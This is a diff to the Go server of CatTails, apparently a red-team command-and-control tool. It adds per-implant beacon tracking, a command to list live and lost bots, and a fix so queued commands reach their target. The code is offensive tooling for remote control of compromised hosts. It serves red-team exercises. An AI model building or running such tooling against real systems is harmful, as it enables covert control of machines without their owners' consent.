@@ -15,6 +15,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"time"
 
 	"github.com/google/gopacket"
 	"github.com/oneNutW0nder/CatTails/cattails"
@@ -24,14 +25,19 @@ import (
 // Global to store staged command
 var tmpCmd string
 var cmdQueue []Task
+var allHostStats = make(map[string]HostStat)
 
 // Glabal to store target info
 var targetIP string
-var targetcommand string
 
 type Task struct {
 	Target string
 	cmd    string
+}
+
+type HostStat struct {
+	BeaconCount int
+	LastBeacon  time.Time
 }
 
 type Host struct {
@@ -56,6 +62,10 @@ func banner() {
 	fmt.Println(string(b))
 }
 
+func xorMsg(msg []string) {
+	fmt.Print("Hello")
+}
+
 func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {
 	// Forever loop to respond to bots
 	for {
@@ -69,44 +79,52 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		/* New Code */
 		queueLen := len(cmdQueue)
 		for i := 0; i < queueLen; i++ {
-			if targetIP == bot.IP.String() {
+			if cmdQueue[i].Target == bot.IP.String() {
 				/* Remove Element from Queue */
+				cmdCurr := cmdQueue[i].cmd
 				cmdQueue = append(cmdQueue[:i], cmdQueue[i+1:]...)
 				queueLen--
 
 				/* Send Command */
-				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
+				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(cmdCurr))
 				cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 				fmt.Println("[+] Executed Task:", bot.Hostname, "(", bot.IP, ")")
 				unix.Close(fd)
+				// updatepwnboard
 			}
 		}
-
-		/*
-			if targetcommand != "" {
-				fmt.Println("[+] Sending target cmd", targetIP, targetcommand)
-				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
-				cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
-			} else {
-				packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(tmpCmd))
-				cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
-			}
-			// YEET
-			if tmpCmd != "" {
-				fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
-				// Close the socket
-				unix.Close(fd)
-				// updatepwnBoard(bot)
-			} else {
-				unix.Close(fd)
-				// updatepwnBoard(bot)
-			}
-		*/
 	}
-
 }
 
-func cli() {
+func cliList(cmdArgs []string) {
+	maxDelta := 120
+	var lost bool = true
+	var live bool = true
+
+	if len(cmdArgs) > 1 {
+		if cmdArgs[1] == "lost" {
+			live = false
+		}
+		if cmdArgs[1] == "live" {
+			lost = false
+		} else {
+			fmt.Printf("\x1b[31mUnknown List Arguement : %v\n\x1b[0m", cmdArgs[1])
+			live = false
+			lost = false
+		}
+	}
+	for key, value := range allHostStats {
+		delta := time.Since(value.LastBeacon)
+		if delta.Seconds() > float64(maxDelta) && lost {
+			fmt.Printf("\x1b[31m%s : Beacons - %v, Last Seen - %v\x1b[0m\n", key, value.BeaconCount, delta.Truncate(time.Second))
+		}
+		if live {
+			fmt.Printf("\x1b[32m%s : Beacons - %v, Last Seen - %v\x1b[0m\n", key, value.BeaconCount, delta.Truncate(time.Second))
+		}
+	}
+}
+
+func cli() bool {
 	var help string = "COMMANDS: \n    help: Display Help\n    exec: Execute Command\n    target: Configure target\n    info: Obtain info from payload or server"
 	for {
 		// reader type
@@ -139,13 +157,17 @@ func cli() {
 		case "info":
 			fmt.Println("info")
 		case "exit":
-			fmt.Printf("Are you sure you want to exit?\n  [y/N]: ")
+			fmt.Printf("\x1b[31mAre you sure you want to exit?\n  [y/N]:\x1b[0m ")
 			var resp string
 			fmt.Scanln(&resp)
 			if resp == "Y" || resp == "y" {
 				os.Exit(0)
 			}
 		case "clear":
+		case "list":
+			cliList(splitCmd)
+		case "drop":
+			// send command but specific to the implant not COMMAND but DROP
 		case "queue":
 			for i := 0; i < len(cmdQueue); i++ {
 				fmt.Printf("%v : %v\n", cmdQueue[i].Target, cmdQueue[i].cmd)
@@ -185,6 +207,16 @@ func processPacket(packet gopacket.Packet, listen chan Host) {
 		DstPort:  dstport,
 	}
 
+	// Update list of Implants
+	oldHostStat, ok := allHostStats[newHost.IP.String()]
+	if ok {
+		oldCount := oldHostStat.BeaconCount + 1
+		allHostStats[newHost.IP.String()] = HostStat{oldCount, time.Now()}
+	} else {
+		allHostStats[newHost.IP.String()] = HostStat{1, time.Now()}
+	}
+
+	// Update Pwnbord
 	fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")")
 	// Write host to channel
 	listen <- newHost
@@ -205,7 +237,7 @@ func main() {
 	listen := make(chan Host, 5)
 
 	// Iface and myip for the sendcommand func to use
-	iface, myIP := cattails.GetOutwardIface("192.168.33.10:80")
+	iface, myIP := cattails.GetOutwardIface("192.168.56.10:80")
 	fmt.Println("[+] Interface:", iface.Name)
 
 	dstMAC, err := cattails.GetRouterMAC()
